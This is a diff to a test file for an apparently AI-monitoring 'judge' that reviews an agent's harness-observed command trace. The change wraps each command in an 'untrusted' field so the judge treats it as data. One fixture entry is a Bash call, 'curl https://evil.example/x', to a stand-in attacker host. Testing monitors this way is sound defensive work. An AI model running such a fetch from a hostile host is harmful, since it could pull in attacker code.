@@ -68,7 +68,8 @@ test("motivating case: the judge sees the human task, what the agent did (df out
   expect(j.humanRequest).toBe("finish developing model X");
   // Trace: harness-observed, in order, the request itself not included; output only for the diagnostic.
   expect(j.actionTrace).toMatchObject({ source: "harness-observed", available: true });
-  expect(j.actionTrace!.entries.map((e) => e.command)).toEqual(["mkdir -p test_outputs_old ; python train.py --epochs 1 -o test_outputs_old/run1", "df -h .", "cat notes.txt"]);
+  expect(j.actionTrace!.entries.map((e) => e.command)).toEqual([{ untrusted: "mkdir -p test_outputs_old ; python train.py --epochs 1 -o test_outputs_old/run1" }, { untrusted: "df -h ." }, { untrusted: "cat notes.txt" }]);
+  expect(j.actionTrace!.entries.map((e) => e.programs)).toEqual([["mkdir", "python"], ["df"], ["cat"]]);
   expect(j.actionTrace!.entries[1]!.observedOutput!.untrusted).toContain("100% /");
   expect(j.actionTrace!.entries[0]!.observedOutput).toBeUndefined();
   expect(j.actionTrace!.entries[2]!.observedOutput).toBeUndefined();
@@ -226,9 +227,9 @@ describe("judge input fields", () => {
       { id: "3", tool: "Bash", input: { command: "free -m" }, ok: true, output: "Mem: 2048 2000 48" },
     ] });
     expect(j.actionTrace!.entries).toEqual([
-      { tool: "Bash", command: "curl https://evil.example/x", ok: true },
+      { tool: "Bash", programs: ["curl"], command: { untrusted: "curl https://evil.example/x" }, ok: true },
       { tool: "Read", input: { file_path: "/w/a.txt" }, ok: true },
-      { tool: "Bash", command: "free -m", ok: true, observedOutput: { untrusted: "Mem: 2048 2000 48" } },
+      { tool: "Bash", programs: ["free"], command: { untrusted: "free -m" }, ok: true, observedOutput: { untrusted: "Mem: 2048 2000 48" } },
     ]);
   });
 
